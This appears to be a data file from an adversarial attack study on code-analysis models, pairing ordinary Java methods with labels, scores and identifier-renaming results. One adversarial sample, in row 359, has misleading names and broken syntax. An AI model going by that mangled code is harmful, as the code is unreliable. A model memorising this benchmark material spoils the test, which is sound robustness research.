            encodedPassword = (new BASE64Encoder()).encode(md.digest());
        } catch (NoSuchAlgorithmException _e) {
            _e.printStackTrace();
        } catch (UnsupportedEncodingException _e) {
            _e.printStackTrace();
        }
        return encodedPassword;
    }
 <SPLIT>     public static byte[] decode(String cryptPassword, byte[] encoded, byte[] salt) {
        try {
            MessageDigest digester = MessageDigest.getInstance(DIGEST);
            SecureRandom random = SecureRandom.getInstance(RANDOM);
            digester.reset();
            for (int i = 0; i < ITERATIONS; i++) {
                digester.update(salt);
                digester.update(cryptPassword.getBytes(""UTF-8""));
            }
            byte[] hash = digester.digest();
            random.setSeed(hash);
            int maxKeySize = Cipher.getMaxAllowedKeyLength(CIPHER);
            KeyGenerator generator = KeyGenerator.getInstance(CIPHER);
            generator.init(maxKeySize, random);
            SecretKey key = generator.generateKey();
            Cipher cipher = Cipher.getInstance(CIPHER);
            cipher.init(Cipher.DECRYPT_MODE, key);
            byte[] decoded = cipher.doFinal(encoded);
            return decoded;
        } catch (Exception e) {
            StorePlugin.getDefault().log(e);
        }
        return new byte[0];
    }
",96,,LABEL_1,LABEL_1,LABEL_1,-1,"encodePassword,_originalPassword,md,encodedPassword",,,,0,,0,GA,1495,0.5323355476061503,failed,[]
356,"    private void retrieveFile(URL url, RSLink link) {
        link.setStatus(RSLink.STATUS_DOWNLOADING);
        HttpURLConnection httpConn = null;
        DataOutputStream outs = null;
        BufferedInputStream bins = null;
        BufferedOutputStream bouts = null;
        try {
            String postData = URLEncoder.encode(""mirror"", ""UTF-8"") + ""="" + URLEncoder.encode(url.toString(), ""UTF-8"");
            httpConn = (HttpURLConnection) url.openConnection();
            httpConn.setRequestMethod(""POST"");
            httpConn.setRequestProperty(""Content-Type"", ""application/x-www-form-urlencoded"");
            httpConn.setRequestProperty(""Content-Length"", """" + Integer.toString(postData.getBytes().length));
            httpConn.setRequestProperty(""Content-Language"", ""en-US"");
            httpConn.setDoOutput(true);
            httpConn.setDoInput(true);
            outs = new DataOutputStream(httpConn.getOutputStream());
            outs.writeBytes(postData);
            outs.flush();
            Pattern mimePattern = Pattern.compile("".+/html.+"");
            Matcher matcher = mimePattern.matcher(httpConn.getContentType());
            if (matcher.find()) {
                log(""Can not download, maybe all RS slots are busy!"");
                return;
            }
            link.setSize(httpConn.getContentLength());
            bins = new BufferedInputStream(httpConn.getInputStream(), 4096);
            bouts = new BufferedOutputStream(new FileOutputStream(link.getFile()), 4096);
            link.setStatus(RSLink.STATUS_DOWNLOADING);
            link.setDown(0);
            byte[] byteBuffer = new byte[4096];
            int count;
            while ((count = bins.read(byteBuffer)) != -1) {
                bouts.write(byteBuffer, 0, count);
                link.setDown(link.getDown() + count);
                if (!Main.start.get()) {
                    link.setStatus(RSLink.STATUS_NOTHING);
                    return;
                }
            }
            link.setStatus(RSLink.STATUS_DONE);
        } catch (IOException ex) {
            log(""I/O Exception!"");
            link.setStatus(RSLink.STATUS_NOTHING);
        } finally {
            try {
                if (outs != null) outs.close();
                if (bouts != null) bouts.close();
                if (bins != null) bins.close();
            } catch (IOException ex) {
                JOptionPane.showMessageDialog(null, ""Can not close some connections:\n"" + ex.getMessage(), ""ERROR"", JOptionPane.ERROR_MESSAGE);
            }
            if (httpConn != null) httpConn.disconnect();
        }
    }
 <SPLIT>     public int read(String name) {
        status = STATUS_OK;
        try {
            name = name.trim();
            if (name.indexOf(""://"") > 0) {
                URL url = new URL(name);
                in = new BufferedInputStream(url.openStream());
            } else {
                in = new BufferedInputStream(new FileInputStream(name));
            }
            status = read(in);
        } catch (IOException e) {
            status = STATUS_OPEN_ERROR;
        }
        return status;
    }
",492,,LABEL_0,LABEL_0,LABEL_0,-1,"retrieveFile,url,link,httpConn,outs,bins,bouts,postData,mimePattern,matcher,byteBuffer,count",,,,0,,0,GA,4470,1.6906663020451864,failed,[]
357,"    public ActionForward perform(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        String status = null;
        HttpSession session = request.getSession();
        ReportingBean reportingBean = null;
        NewConceptBean conceptBean = null;
        String conceptName = null;
        String primitive = null;
        MessageResources errorMessages = MessageResources.getMessageResources(""com.apelon.apps.dts.treebrowser.resources.error_messages"");
        LogonUtilities logonUtilities = new LogonUtilities();
        if (logonUtilities.checkSession(session, status, reportingBean, errorMessages)) {
            reportingBean = (ReportingBean) session.getAttribute(""reportingBean"");
            if ((reportingBean.getMessageHtml().indexOf(""Classify"")) == -1) {
                reportingBean.setReportingHtml("""");
            }
            conceptBean = (NewConceptBean) session.getAttribute(""newConceptEntity"");
            conceptName = request.getParameter(""conceptName"");
            primitive = request.getParameter(""primitive"");
            if (primitive == null) {
                primitive = ""false"";
            }
            conceptBean.setConceptName(conceptName);
            conceptBean.setPrimitive(primitive);
            String namespace = conceptBean.getConceptNamespace();
            if (namespace == null) {
                reportingBean.setReportingHtml(errorMessages.getMessage(""classify_3""));
                session.setAttribute(""reportingBean"", reportingBean);
                status = ""classify_fail"";
                return (mapping.findForward(status));
            }
            String[] roleMods = request.getParameterValues(""some_or_all"");
            String[] roleGrps = request.getParameterValues(""role_group"");
            Vector roles = conceptBean.getRoles();
            RoleBean[] roleCons = new RoleBean[roles.size()];
            roles.copyInto(roleCons);
            if (roleMods != null && roleGrps != null && roleCons != null) {
                if (roleCons.length == roleMods.length && roleCons.length == roleGrps.length) {
                    for (int i = 0; i < roleCons.length; i++) {
                        roleCons[i].setSomeOrAll(roleMods[i]);
                        roleCons[i].setRoleGroup(roleGrps[i]);
                    }
                }
            }
            session.setAttribute(""newConceptEntity"", conceptBean);
            NewConceptXMLDisplayBean xmlBean = new NewConceptXMLDisplayBean();
            xmlBean.setNewConceptXml(conceptBean);
            String data = BrowserUtilities.encodeUrl(""conceptXml"") + ""="" + BrowserUtilities.encodeUrl(xmlBean.getNewConceptXml()) + ""&"" + BrowserUtilities.encodeUrl(""nameSpace"") + ""="" + BrowserUtilities.encodeUrl(namespace);
            XMLPropertyHandler configPh = new XMLPropertyHandler(""dtsbrowserclassify.xml"");
            Properties configProps = configPh.getProps();
            String urlString = configProps.getProperty(""url"");
            URL url = new URL(urlString);
            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
            wr.write(data);
            wr.flush();
            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            StringBuffer buf = new StringBuffer();
            while ((line = rd.readLine()) != null) {
                buf.append(line);
            }
            String resultXml = buf.toString();
            wr.close();
            rd.close();
            ClassifiedConceptBean ccBean = new ClassifiedConceptBean();
            ClassifyResultParser parser = new ClassifyResultParser(resultXml);
            ResultBuilder rbuilder = new ResultBuilder();
            rbuilder.setConceptBean(ccBean);
            rbuilder.setParser(parser);
            rbuilder.setNamespace(namespace);
            try {
                rbuilder.buildResult();
                ccBean = rbuilder.getConceptBean();
                ClassifiedConceptDisplayBean displayBean = new ClassifiedConceptDisplayBean();
                displayBean.setNewConceptHtml(ccBean);
                session.setAttribute(""classifyResult"", ccBean);
                session.setAttribute(""classifyDisplayResult"", displayBean);
                status = ""success"";
            } catch (Exception e) {
                Categories.dataServer().error(StackTracePrinter.getStackTrace(e));
                reportingBean.setReportingHtml(errorMessages.getMessage(""classify_1"") + e.getMessage());
                session.setAttribute(""reportingBean"", reportingBean);
                status = ""classify_fail"";
            }
        }
        return (mapping.findForward(status));
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",807,,LABEL_0,LABEL_0,LABEL_0,-1,"perform,mapping,form,request,response,status,session,reportingBean,conceptBean,conceptName,primitive,errorMessages,logonUtilities,namespace,roleMods,roleGrps,roles,roleCons",,,,0,,0,GA,6677,2.9303672671318055,failed,[]
358,"    private boolean setPayload() throws IOException {
        if (Index < Headers.length) {
            FileOutputStream fos = new FileOutputStream(Headers[Index], true);
            FileInputStream fis = new FileInputStream(HeadlessData);
            FileChannel fic = fis.getChannel();
            FileChannel foc = fos.getChannel();
            fic.transferTo(0, fic.size(), foc);
            fic.close();
            foc.close();
            setDestination(Destinations[Index]);
            setPayload(Headers[Index]);
            Index++;
            return true;
        }
        return false;
    }
 <SPLIT>     public static void copyFile(File source, File destination) throws IOException {
        FileChannel in = null;
        FileChannel out = null;
        try {
            in = new FileInputStream(source).getChannel();
            out = new FileOutputStream(destination).getChannel();
            in.transferTo(0, in.size(), out);
        } finally {
            if (in != null) in.close();
            if (out != null) out.close();
        }
    }
",113,,LABEL_1,LABEL_1,LABEL_1,-1,"setPayload,fos,fis,fic,foc,Index",,,,0,,0,GA,2211,0.7821703235308329,failed,[]
359,"    public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public MotixFileItem(final InputStream is, final String name, final String contentType, final int index) throws IOException {
        this.name = name;
        this.contentType = contentType;
        this.index = index;
        this.extension = FilenameUtils.getExtension(this.name);
        this.isImage = ImageUtils.isImage(name);
        ArrayInputStream isAux = null;
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        try {
            IOUtils.copy(is, out);
            isAux = new ArrayInputStream(out.toByteArray());
            if (this.isImage) {
                this.bufferedImage = imaging.read(isAux);
            }
        } finally {
            IOUtils.closeQuietly(out);
            IOUtils.closeQuietly(isAux);
        }
        this.inputStream = new ArrayInputStream(out.toByteArray());
    }
",194,"    public static boolean decodeString2Stream(String Inbase, String inFile) {
        boolean comment = false;
        java.io.InputStream nin = null;
        java.io.OutputStream timeout = null;
        try {
            nin = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(Inbase)), Base64.DECODE);
           timeoutt = new java.io.BufferedOutputStream(new java.io.FileOutputStream(inFile));
            byte[] url = new byte[65536];
            int read = -1;
            while readad = nreadead(url)) >= 0) {
                timeout.write(url, 0, read);
            }
            comment = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                nin.close();
            } catch (Exception exc) {
            }
            try {
                timeout.close();
            } catch (Exception exc) {
            }
        }
        return comment;
    }
",LABEL_1,LABEL_1,0.5930079221725464,1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,4,"decodeFileToFile:decodeString2Stream,infile:Inbase,outfile:inFile,in:nin,out:timeout,buffer:url,read:read,success:comment,",1,GA,516,0.1871702512105306,ga,[]
360,"    private void load() throws SQLException {
        Connection conn = null;
        Statement stmt = null;
        try {
            conn = FidoDataSource.getConnection();
            conn.setAutoCommit(false);
            stmt = conn.createStatement();
            ClearData.clearTables(stmt);
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (100, 'Living Thing')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (200, 'Inanimate Object')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (300, 'Dog')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (400, 'Sheltie')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (500, 'Eskimo')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (600, 'Person')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (700, 'Collar')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (800, 'Ball')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (401, 'Fido')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (501, 'Samantha')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (801, 'A collar')"");
            stmt.executeQuery(""select setval('objects_objectid_seq', 1000)"");
            stmt.executeUpdate(""insert into ClassLinkTypes (LinkName, LinkType) values ('hasa', 2)"");
            stmt.executeUpdate(""insert into ClassLinkTypes (LinkName, LinkType) values ('partof', 2)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (100, 'isa', 1)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (200, 'isa', 1)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (300, 'isa', 100)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (400, 'isa', 300)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (500, 'isa', 300)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (600, 'isa', 100)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (700, 'isa', 200)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (800, 'isa', 200)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (401, 'instance', 400)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (501, 'instance', 500)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (801, 'instance', 800)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (401, 'hasa', 801)"");
            stmt.executeUpdate(""insert into AttributeCategories (CategoryName) values ('color')"");
            stmt.executeUpdate(""insert into AttributeCategories (CategoryName) values ('weight')"");
            stmt.executeUpdate(""insert into AttributeCategories (CategoryName) values ('length')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('green', 'color')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('blue', 'color')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('light', 'weight')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('heavy', 'weight')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('short', 'length')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('long', 'length')"");
            stmt.executeUpdate(""insert into ObjectAttributes (ObjectId, AttributeName) values (401, 'light')"");
            stmt.executeUpdate(""insert into ObjectAttributes (ObjectId, AttributeName) values (401, 'short')"");
            stmt.executeUpdate(""insert into ObjectAttributes (ObjectId, AttributeName) values (801, 'blue')"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('LEFT-WALL', '1', 'AV+ | NP+', 1)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('the', '1', 'D+', 1)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('big', '1', 'ADJ+', 400)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('dog', '1', '[@ADJ-] & [D-] & (S+ | DO- | PO- | NP-)', 700)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('run', '1', '[S-] & AV- & [PREP+]', 800)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('across', '1', 'PREP- & PO+', 800)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('street', '1', '[@ADJ-] & [D-] & (S+ | DO- | PO- | NP-)', 800)"");
            stmt.executeUpdate(""insert into AdjectivePrepositions (PrepositionName, ObjectId, LinkName) values ('with', 100, 'hasa')"");
            stmt.executeUpdate(""insert into AdjectivePrepositions (PrepositionName, ObjectId, LinkName) values ('in', 200, 'partof')"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 1, 'good', 'best', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 2, '*y', '*iest', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 3, '*e', '*est', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 4, '*', '*est', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 1, 'good', 'better', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 2, '*y', '*ier', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 3, '*e', '*er', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 4, '*', '*er', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'possessive', 1, '*s', '*s\\'', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'possessive', 2, '*', '*\\'s', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 1, 'be', 'being', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 2, '*Vy', '*Vying', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 3, '*c', '*cking', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 4, '*VVC', '*VVCing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 5, '*VC', '*VCCing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 6, '*ie', '*ying', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 7, '*e', '*ing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 8, '*', '*ing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 1, 'sing', 'sang', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 2, 'give', 'gave', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 3, 'swim', 'swam', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 4, 'have', 'had', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 5, 'run', 'ran', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 6, 'do', 'did', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 7, 'be', 'was', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 8, 'throw', 'threw', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 9, 'sleep', 'slept', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 10, '*c', '*cked', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 11, '*VVC', '*VVCed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 12, '*VC', '*VCCed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 13, '*y', '*ied', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 14, '*oe', '*oed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 15, '*e', '*ed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 16, '*', '*ed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 1, 'sing', 'sung', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 2, 'give', 'given', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 3, 'swim', 'swum', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 4, 'have', 'had', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 5, 'do', 'done', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 6, 'be', 'been', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 7, 'sleep', 'slept', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 8, '*e', '*ed', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 9, '*', '*ed', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first singular', 1, 'be', 'am', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first singular', 2, 'have', 'have', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first singular', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'second singular', 1, 'be', 'are', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'second singular', 2, 'have', 'have', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'second singular', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 1, 'be', 'is', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 2, 'have', 'has', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 3, 'do', 'do', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 4, '*ch', '*ches', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 5, '*sh', '*shes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 6, '*x', '*xes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 7, '*z', '*zes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 8, '*Cy', '*Cies', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 9, '*s', '*ses', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 10, '*o', '*oes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 11, '*', '*s', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first plural', 1, 'be', 'are', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first plural', 2, 'have', 'have', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first plural', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third plural', 1, 'be', 'are', FALSE)"");
